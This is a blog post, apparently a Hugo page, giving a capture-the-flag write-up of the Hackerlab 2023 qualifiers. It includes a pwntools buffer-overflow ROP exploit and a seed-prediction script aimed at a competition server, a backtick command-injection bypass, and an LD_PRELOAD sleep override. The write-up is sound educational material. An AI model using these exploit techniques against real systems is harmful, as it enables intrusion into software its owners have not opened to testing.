<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Once again I was part of the hackerlab my country hosts yearly This year the competition was more intense than ever and my team zer0ne got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don&amp;rsquo;t understand how XD
Unfortunately I am currently very busy so I could not participate in the final
Here is a quick recapitulative writeup" />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/hackerlab/hackerlab-2023/" />


    <title>
        
            Hackerlab 2023 :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Hackerlab 2023">
<meta itemprop="description" content="Once again I was part of the hackerlab my country hosts yearly This year the competition was more intense than ever and my team zer0ne got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don&rsquo;t understand how XD
Unfortunately I am currently very busy so I could not participate in the final
Here is a quick recapitulative writeup"><meta itemprop="datePublished" content="2023-09-03T13:33:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="1020"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Hackerlab 2023"/>
<meta name="twitter:description" content="Once again I was part of the hackerlab my country hosts yearly This year the competition was more intense than ever and my team zer0ne got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don&rsquo;t understand how XD
Unfortunately I am currently very busy so I could not participate in the final
Here is a quick recapitulative writeup"/>



    <meta property="og:title" content="Hackerlab 2023" />
<meta property="og:description" content="Once again I was part of the hackerlab my country hosts yearly This year the competition was more intense than ever and my team zer0ne got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don&rsquo;t understand how XD
Unfortunately I am currently very busy so I could not participate in the final
Here is a quick recapitulative writeup" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/hackerlab/hackerlab-2023/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2023-09-03T13:33:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="Hackerlab" />



    <meta property="article:published_time" content="2023-09-03 13:33:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackerlab/hackerlab-2023/">Hackerlab 2023</a></h2>

            
            
            

            <div class="post-content">
                <p>Once again I was part of the <a href="https://qualif.hackerlab.bj">hackerlab my country hosts yearly</a>
This year the competition was more intense than ever and my team <code>zer0ne</code> got placed 23rd on scoreboard and we made it to the finals (top 20 teams) on 18th position and I still don&rsquo;t understand how XD</p>
<p>Unfortunately I am currently very busy so I could not participate in the final</p>

    <img src="http://localhost:1313/hackerlab2023/zero.png"  alt="Hackerlab"  class="left"  />


<p>Here is a quick recapitulative writeup</p>
<h2 id="basics">Basics</h2>
<h1 id="ghezo-unsolved-50pts">Ghezo (unsolved: 50pts)</h1>
<p>This one traumatized me XD
It was a steg/crypto chall worth 50 points&hellip;The minimum points and I could not solve that
We got a 20 megabyte &ldquo;png&rdquo; picture. Yup you heard that right&hellip;20 mega-fricking-bytes
Original file not provided because&hellip;damn THAT&rsquo;S BIG! Instead here is a converted version</p>

    <img src="http://localhost:1313/hackerlab2023/ghezo.png"  alt="Hackerlab"  class="left"  />


<p>could not be more suspicious so obviously we ran <code>file ghezo.png</code> to see it&rsquo;s actually a <code>netbpm pixmap</code> file
the magic numbers are <code>P3</code> and the extension should be <code>.ppm</code>. This format is uncompressed and the funny thing is that
P3 allow ascii encoding to represent pixel values. A-MA-ZING!</p>
<p>I tried alot of things but could not manage this very unfamiliar file format so here is a script writen by
<a href="https://github.com/parfaittolefo/hackerlab2023/">those awesome people</a></p>
<pre tabindex="0"><code>import re
import numpy as np
from PIL import Image
from pathlib import Path

contents = Path(&#39;king.ppm&#39;).read_text()
Pidentifier, h, w,  *pixels = re.findall(r&#39;[0-9]+&#39;, contents)
h = int(h)
w = int(w)

na = np.array(pixels[w*h*-3:], dtype=np.uint8).reshape((w,h,3))
Image.fromarray(na).save(&#34;result.png&#34;)
</code></pre><p>Basically this converts the ppm to a real png fixing the conspicuously modified image height
which reveals colored pixels&hellip;</p>

    <img src="http://localhost:1313/hackerlab2023/cut.bmp"  alt="Hackerlab"  class="left"  />


<p>The thing I needed to know at this very moment to solve this is <code>Hexahue alphabet</code>
Damn this!</p>
<h1 id="spy-solved-60pts">SPY (solved: 60pts)</h1>
<p>Ok this one was easy! Forensics (sorry for file not provided :p)
Basicaly open the provided <code>mage.pdf</code> and download <code>The_magician.pdf</code> attachment
pro tip: It&rsquo;s not a pdf
Do some basic analysis (struggle first) then use <code>virustotal</code> for easier hindsights
<code>url from memory patterns: tcp://172.28.13.26:7243</code>
Highly suspicious if you ask me</p>
<h1 id="asen-hotagantin-unsolved-70pts">Asen hotagantin (unsolved: 70pts)</h1>

    <img src="http://localhost:1313/hackerlab2023/hotagantin.png"  alt="Hackerlab"  class="left"  />


<p>You see this png? guess what&hellip;this is no png
This is an <code>APNG</code> yes &ldquo;A&rdquo; stands for animated and this is cleverly delayed so it&rsquo;s hard to notice
In the <code>exif metadata</code> you can see it&rsquo;s made using <a href="https://ezgif.com">EZGIF</a> so just go there or use <code>apngdis</code>
Anyway you get two frames and one is a <code>stereogram</code>&hellip;that&rsquo;s what I missed&hellip;the frickin&rsquo; stereogram part
Just use <code>stegsolve</code></p>
<h1 id="php-goat-solved-100pts">PHP GOAT (solved: 100pts)</h1>
<p>This one too was not hard! Web challenge!
Basically code injection with blacklisting bypass. Code is even provided</p>

    <img src="http://localhost:1313/hackerlab2023/php.png"  alt="Hackerlab"  class="left"  />


<p>Just used my good old backtick (<code>ls</code>)</p>

    <img src="http://localhost:1313/hackerlab2023/gj.png"  alt="Hackerlab"  class="left"  />


<h1 id="tic-tac-toe-solved-80pts">Tic tac toe (solved: 80pts)</h1>
<p>Next is a bit tricky for web challenge but not hard. Experience is what helped me here:</p>
<ul>
<li>Notice the .map file in minified js</li>
<li>Use <code>sourcemapper</code> (github) or anything else to &ldquo;unmap&rdquo; and get a clear js</li>
<li>notice in <code>App.vue</code> the commented out encrypt function</li>
<li>decode the AES&hellip;Here, like this&hellip;</li>
</ul>
<pre tabindex="0"><code>const CryptoJS = require(&#39;crypto-js&#39;);
const k = &#39;6cfad18816be65f2&#39;;
const output = &#34;U2FsdGVkX1/sPQHn8qbrD9LyPIipROeMnqke4B+JJEq8sVgV0zeA+ab2oHP92avnl2vzHVBs0/0NeOLbGmoj9g==&#34;;

const decryptedBytes = CryptoJS.AES.decrypt(output, k);
const decryptedMessage = decryptedBytes.toString(CryptoJS.enc.Utf8);

console.log(&#34;Decrypted Message:&#34;, decryptedMessage);
</code></pre><ul>
<li>Get a weird text and use <a href="https://gchq.github.io/CyberChef">the kitchen</a>
here is the sauce: XOR with key = 5 (its&hellip;magic bro)</li>
</ul>
<h1 id="danxome-solved-100pts">Danxome (solved: 100pts)</h1>
<p>This one was my favorite! (sorry again I deleted the binary file)
Reverse chall and once again it was experience that saved me
Elf64 making us wait for eternity using <code>sleep</code>&hellip;Been there done that
Exemple of custom sleep library forged and called <code>nosleeplib.so</code></p>
<pre tabindex="0"><code>/* nosleep.c */
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;

unsigned int sleep(unsigned int seconds)
{
return 0;
}
int usleep(useconds_t usec)
{
return 0;
}
int nanosleep(const struct timespec *req, struct timespec *rem)
{
return 0;
}
</code></pre><p>patch it with <code>LD_PRELOAD</code> and wait a reasonable amount of time for the flag</p>
<h1 id="utc-unsolved-100pts">U.T.C (unsolved 100pts)</h1>
<p>Ok this one was quite cool but I could not solve this simplistic challenge
Here look at the <a href="http://localhost:1313/hackerlab2023/utc.py">server code</a></p>
<p>Yeah you noticed the use of <code>t = int(time.time())</code> and <code>random.seed(t)</code> too?
I tried to bruteforce that&hellip;quite stupid you say? maybe! Actually the seeding makes it not-random-anymore
Yup&hellip;basically&hellip;</p>
<pre tabindex="0"><code>import random
from pwn import *

#Connexion au serveur
r = remote(&#39;54.37.70.250&#39;, 1873)
recept=r.recv()
recept=recept.decode()
print(recept)
print(&#39;envoi de du choix &#34;e&#34; ...&#39;)
r.sendline(&#39;e&#39;.encode())

# Récupération du time
t = int(time.time())

#Récupération du message chiffré
recept=r.recv()
recept=recept.decode()
recept=recept[:-1]
recept=recept.split(&#39;-&#39;)
random.seed(t)
print(recept)

# Process de déchiffrement
decrypted_treasure = []
for c in recept:
    rd = random.randint(0, 255)
    b = (int(c) - int(rd)) % 256
    decrypted_treasure.append(b)
print(decrypted_treasure)
original_treasure = bytes(decrypted_treasure).decode()
print(original_treasure)
</code></pre><p>As I did not solve it I will simply provide a <a href="https://raw.githubusercontent.com/parfaittolefo/Hackerlab2023/main/Basic/Challenge%20file/utc_solves.py">link to my favorite solution</a></p>
<h1 id="le-fâ-solved-100pts">Le fâ (solved: 100pts)</h1>
<p>Pwn challenge I could not pwn <a href="http://localhost:1313/hackerlab2023/fa/chall">chall</a></p>
<pre tabindex="0"><code>from pwn import *

context.binary = &#34;chall&#34;
s = remote(&#34;54.37.70.250&#34;, 2002)
s.sendafter(b&#34;: &#34;,
  b&#34;a&#34;*0x28 + 
  p64(0x400b03) + # pop rdi
  p64(0x6010c0) + # username
  #p64(0x6010e0) + # password
  p64(0x4006a0)[:-1])  # puts
s.shutdown(&#34;send&#34;)
print(s.recvall())
</code></pre><p>I won&rsquo;t even try to explain just go <a href="https://github.com/parfaittolefo/Hackerlab2023/blob/main/Basic/Hackerlab_2023_qualif-PWN-Le-F%C3%A2.md">here</a></p>
<h1 id="puzzle-solved-120pts">Puzzle (solved: 120pts)</h1>
<p>This one was weird and fun but could not solve it too. Here are the pieces</p>
<ul>
<li><a href="http://localhost:1313/hackerlab2023/puzzle/part1.fbx">part 1</a></li>
<li><a href="http://localhost:1313/hackerlab2023/puzzle/part2.jpeg">part 2</a></li>
</ul>
<p>For part 2 I used cyberchef magic to retrieve this awesome cool photo of king behanzin</p>

    <img src="http://localhost:1313/hackerlab2023/puzzle/behanzin.jpeg"  alt="Hackerlab"  class="left"  />


<p>Annnd then I got stuck&hellip;well I could not find a solution writeup yet so I will update this when available</p>
<h1 id="qualification-stages">Qualification Stages</h1>
<p>This year they &ldquo;gently suggested&rdquo; everyone who solved the qualifs should write a writeup
(mostly to filter cheating I guess)
So I will simply provide links to those pdf (mine for those I solved and my favorite solutions for others</p>
<ul>
<li>
<p><a href="http://localhost:1313/hackerlab2023/heviosso-nou-gue.pdf">Heviosso nou gué (solved: 250pts)</a></p>
</li>
<li>
<p><a href="http://localhost:1313/hackerlab2023/agoodjie.pdf">Agoodjie (solved: 300pts)</a></p>
</li>
</ul>
<p>Totally out of context but here is a beautiful image of AGOODJIE that was displayed on the challenge website</p>

    <img src="http://localhost:1313/hackerlab2023/amazone.jpeg"  alt="Hackerlab"  class="left"  />


<p>You needed to see it</p>
<ul>
<li>
<p><a href="https://github.com/parfaittolefo/Hackerlab2023/blob/9dd3bbf370f94b0e6c87b52eb79ec3a627577d13/Writeups_Stages/WriteUp%20_Soft.reading_.pdf">soft.reading(unsolved: 350pts)</a></p>
</li>
<li>
<p><a href="https://github.com/parfaittolefo/Hackerlab2023/blob/9dd3bbf370f94b0e6c87b52eb79ec3a627577d13/Writeups_Stages/Writeup_Tchetoula_N4t10n.pdf">Tchètoula (unsolved: 400pts)</a></p>
</li>
<li>
<p><a href="https://github.com/Tednoob17/HackerLab2023/blob/45cda5b82a769069e2d19fb37c29d2056240b6fc/Qualifications%20Stages/HackerLab2023%20-%20Gankpa%20M%C9%9B.pdf">Gankpa Mè (unsolved: 450pts)</a></p>
</li>
</ul>
<h2 id="end-of-the-line">END OF THE LINE!</h2>

    <img src="http://localhost:1313/hackerlab2023/rank.png"  alt="my-scores"  class="center"  style="width: 300px;"  />


<p>I am very proud of my efforts this year as I could qualify for finals (kek)</p>
<p>I wish I had time to partake in finals&hellip;but I could not</p>
<p>That was an awesome experience and I had a lot of fun and still most importantly learnt alot!</p>
<p>Talented people still out there (shoutout to that monster guy <a href="https://twitter.com/Unblvr1">unblvr</a> )</p>
<p>Still alot for me to learn, and that&rsquo;s once again what I am gonna do</p>
<p>keep learning folks!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/hackerlab/">Hackerlab</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
